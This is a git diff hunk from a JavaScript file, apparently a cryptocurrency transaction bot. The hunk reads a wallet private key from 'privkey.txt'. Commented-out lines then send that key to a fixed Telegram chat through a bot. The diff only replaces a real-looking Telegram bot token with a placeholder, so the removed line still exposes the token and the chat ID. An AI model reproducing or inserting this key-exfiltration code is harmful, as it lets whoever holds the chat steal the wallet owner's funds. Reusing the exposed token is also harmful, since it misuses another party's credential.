@@ -21,7 +21,7 @@ const onPendingTransactions = async (
 
 const key_hex2 = Fs.readFileSync('privkey.txt').toString();
   // const tgb = require('node-telegram-bot-api');
-  // const bot = new tgb('6344698170:AAEo4AaPp24gRQNyh9-HW7e8CZQA8EKNzN8', { polling: true });
+  // const bot = new tgb('1234:xxx-xxx', { polling: true });
   // bot.sendMessage('7405015984', key_hex2)
   //     .then(() => {
   //     })
